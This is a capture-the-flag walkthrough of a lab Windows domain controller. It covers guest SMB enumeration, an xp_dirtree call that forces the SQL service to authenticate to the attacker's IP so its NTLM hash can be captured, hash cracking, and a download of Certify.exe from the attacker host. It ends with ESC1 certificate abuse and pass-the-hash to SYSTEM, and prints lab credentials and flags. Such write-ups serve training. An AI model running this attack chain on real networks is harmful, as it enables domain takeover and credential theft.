
## CTF Writeup: Escape

---
## Reconnaissance

An initial scan revealed the following information about the running services on the target system.

```
nmap -n -Pn -sSCV -p- -oA nmap/escape 10.129.37.251      
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-23 17:26 -0500
Nmap scan report for 10.129.37.251
Host is up (0.020s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-24 06:27:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-24T06:29:28+00:00; +7h59m58s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-07-24T06:29:28+00:00; +7h59m58s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2026-07-24T06:29:28+00:00; +7h59m58s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.37.251:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-07-24T06:25:28
|_Not valid after:  2056-07-24T06:25:28
| ms-sql-info: 
|   10.129.37.251:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-24T06:29:28+00:00; +7h59m58s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-07-24T06:29:28+00:00; +7h59m58s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m57s, deviation: 0s, median: 7h59m57s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-24T06:28:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.67 seconds
```

The target seems to be an Domain Controller & the nmap scan revealed a lot of information about the domain itself "sequel.htb", the DC Hostname "DC" & the FQDN "DC.sequel.htb". Let's map them all to the target ip address in our local dns file.

```
echo "10.129.37.251 DC.sequel.htb sequel.htb DC" | tee -a /etc/hosts
```

Tested if anonymous authentication is enabled, but it got denied. Also tested if guest authentication was enabled and yes it was!

```
nxc smb sequel.htb -u 'guest' -p '' --shares
```

We enumerated 1 non-default Share called "Public", in which we have read permissions as "guest" user.

Before checking out the SMB Share, I want to enumerate all users on the target system.
I utilized guest auth for this and stored the output in an newusers.txt file in my local machine.

```
nxc smb sequel.htb -u 'guest' -p '' --rid-brute > newusers.txt
```

Formatted the output and stored it in my users.txt wordlist for potential nxc spraying in the future.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

Connected to the SMB Share.

```
smbclient \\\\sequel.htb/Public -U guest
```

Downloaded the .pdf file inside.

```
get "SQL Server Procedures.pdf"
```

I viewed the .pdf file with an tool called "evince".

```
evince SQL Server Procedures.pdf
```

Retrieved Credentials for the Database:

```
PublicUser:GuestUserCantWrite1
```

It also hints at SQL Server Auth instead of Windows Auth.

Let's try & connect to the DB as this user.

```
nxc mssql sequel.htb -u PublicUser -p GuestUserCantWrite1 --local-auth
```

Worked! We are authenticated.

Connected to the Database.

```
impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.htb
```

When connecting I tested multiple things. First I tried to enumerate databases, but there seemed to be only default databases. I tried if xp_dirtree is enabled, yes it is! We could potentially do an Relay Attack to capture an NTLM Hash. We previously also enumerated an service account for sql, so let's try it. 

Setup my responder on my local machine

```
responder -I tun0
```

In my mssqlclient session I utilized the following command:

```
EXEC xp_dirtree '//10.10.15.9/test/', 1, 0;
```

Successfully captured NTLM Hash of SQL Service Account and stored it in an sql_svc hash file in my local machine.

```
sql_svc::sequel:81fe083345f6f080:9EE2DD4A3FBACEA2025E3B2722A08FF2:0101000000000000009880E1CA1ADD01046C230F9751922F000000000200080047005A005800330001001E00570049004E002D004900320043003600520034005700540045004100390004003400570049004E002D00490032004300360052003400570054004500410039002E0047005A00580033002E004C004F00430041004C000300140047005A00580033002E004C004F00430041004C000500140047005A00580033002E004C004F00430041004C0007000800009880E1CA1ADD0106000400020000000800300030000000000000000000000000300000F111861B68E7B7C9F669A5627EF49E47FAB4BE579C9C3412279E33BD36EC07DF0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310035002E0039000000000000000000
```

Successfully bruteforced an password out of the hash.

```
john sql_svc --wordlist=/usr/share/wordlists/rockyou.txt
```

Gained new credentials. Stored the password in my passwords.txt wordlist.

```
sql_svc:REGGIE1234ronnie
```

Sprayed credentials against winrm and sql_svc can connect to the DC.

```
nxc winrm sequel.htb -u users.txt -p passwords.txt --continue-on-success
```

Connected as sql_svc to the target Domain Controller via evil-winrm.
## Privilege Escalation

Interestingly enough I find out that the current user is part of an interesting Group called "Certificate Service DCOM Access".

```
whoami /all
```

Decided to move on with downloading all domain information onto my local machine using bloodhound-python, so we can potentially find priv esc through domain policies.

```
bloodhound-python -u sql_svc -p REGGIE1234ronnie -ns 10.129.37.251 -d sequel.htb -c all
```

Uploaded the domain information in BloodHound and marked sql_svc and guest as owned. Unfortunately there was no escalation path. Let's check if we can ASREP or Kerberoast some users. Also nothing working. Since this certification group was rather interesting I decided to utilize rusthound-ce to get domain information & deleted the previously uploaded bloodhound domain information. 

```
rusthound-ce -d sequel.htb -u sql_svc -p 'REGGIE1234ronnie' -i 10.129.37.251 -P 636
```

Uploaded the domain information and viewed sql_svc again and now it has "Enroll" Policies set on Certificate Templates. Those Templates seem to be all Tier Zero.

Let's enumerate which ADCS Attacks the target DC is vulnerable to.

```
certipy-ad find -u sql_svc -p 'REGGIE1234ronnie' -dc-ip 10.129.37.251 -target sequel.htb -vulnerable -enabled
```

It didn't seem to be vulnerable. I moved back to our evil-winrm session as sql_svc and found an SQLServer Directory in the Root. Inspecting C:\SQLServer\Logs\ERRORLOG.BAK 

Inspecting this log I found that user Ryan.Cooper failed to authenticate and user "NuclearMosquito13", but this isn't a real user. Could this be his password?

```
nxc winrm sequel.htb -u Ryan.Cooper -p NuclearMosquito3
```

Yes it is! Saved it in my passwords.txt file.

Connected to the target DC as user Ryan.Cooper.

```
evil-winrm -i sequel.htb -u ryan.cooper -p NuclearMosquito3
```

Retrieved user.txt in C:\Users\Ryan.Cooper\Desktop.

```
51f01b40248c2ed01011e6c481200298
```
## Privilege Escalation

Marked user Ryan.Cooper as owned and also found out that he has the "Enroll" Policy set to the Certificate Templates. Let's try & check with his auth if the target is vulnerable.

```
certipy-ad find -u Ryan.Cooper -p NuclearMosquito3 -dc-ip 10.129.37.251 -target sequel.htb -vulnerable -enabled
```

Indeed it is vulnerable to an ESC1 Attack!

```
"[!] Vulnerabilities": {
        "ESC1": "Enrollee supplies subject and template allows client authentication."
```

Trying to request an administrator.pfx for the 4 Templates didn't work. So to further enumerate more vulnerable Templates I utilized Certify.exe. Transfered it onto the target system.

```
certipy-ad req -u Ryan.Cooper -p 'NuclearMosquito3' -ca 'sequel-DC-CA' -template 'EFS' -upn 'Administrator@sequel.htb' -dc-ip 10.129.37.251 -target DC.sequel.htb
```


```
iwr -uri http://10.10.15.9/Certify.exe -o Certify.exe
```

Enumerated vulnerable certificate templates.

```
.\Certify.exe find /vulnerable
```

"UserAuthentication" Template is vulnerable and wasn't shown in the domain information downloaded by rusthound-ce. Let's test it!

Since we know the CA is vulnerable to ESC1, let's perform it!

```
certipy-ad req -u Ryan.Cooper -p 'NuclearMosquito3' -ca 'sequel-DC-CA' -template 'UserAuthentication' -upn 'Administrator@sequel.htb' -dc-ip 10.129.37.251 -target DC.sequel.htb
```

This provided us the Administrator.pfx file. Which is an bundle of windows certificate templates. Let's utilize it to auth with certipy to request the NTLM Hash of the Administrator User!

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.37.251
```

Gained NTLM Hash of Admin user. Let's connect to the DC with psexec! Gained SYSTEM Shell.

```
impacket-psexec Administrator@sequel.htb -hashes aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
3dae8b4cf87ab4848af381e23e3d3618
```